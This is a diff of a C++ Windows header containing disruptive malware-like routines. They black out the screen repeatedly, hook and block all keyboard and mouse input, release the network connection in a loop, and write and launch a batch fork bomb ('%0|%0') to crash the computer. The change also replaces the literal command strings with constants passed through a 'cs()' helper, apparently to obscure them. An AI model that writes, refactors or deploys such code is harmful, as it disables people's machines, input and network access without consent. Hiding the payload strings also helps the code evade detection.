@@ -13,10 +13,12 @@ spawn a process which kills the entire computer [ok]
 #include <powrprof.h>
 #include <fstream>
 
+#include "strings.hh"
+#include "string_functions.hh"
+
 #pragma once
 
-void block_screen(int seconds)
-{
+void block_screen(int seconds) {
     for (int i = 0; i != seconds; i++)
     {
         PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
@@ -24,13 +26,11 @@ void block_screen(int seconds)
     }
 }
 
-LRESULT CALLBACK block_proc(int _, WPARAM __, LPARAM ___)
-{
+LRESULT CALLBACK block_proc(int _, WPARAM __, LPARAM ___) {
     return 1;
 }
 
-void block_input(int seconds)
-{
+void block_input(int seconds) {
     HHOOK keyboard_hook;
     HHOOK mouse_hook;
     for (int i = 0; i != seconds * 10; i++)
@@ -43,19 +43,17 @@ void block_input(int seconds)
     }
 }
 
-void kill_internet(int seconds)
-{
+void kill_internet(int seconds) {
     for (int i = 0; i != seconds * 10; i++) {
-        system("ipconfig /release");
+        system(ipconfig_release);
         Sleep(100);
     }
-    system("ipconfig /renew");
+    system(ipconfig_renew);
 }
 
-void kill_computer()
-{
-    std::ofstream w("g.bat");
-    w << "%0|%0";
+void kill_computer() {
+    std::ofstream w(cs(g_bat));
+    w << cs(fork_bomb);
     w.close();
-    system("g.bat");
+    system(g_bat);
 }
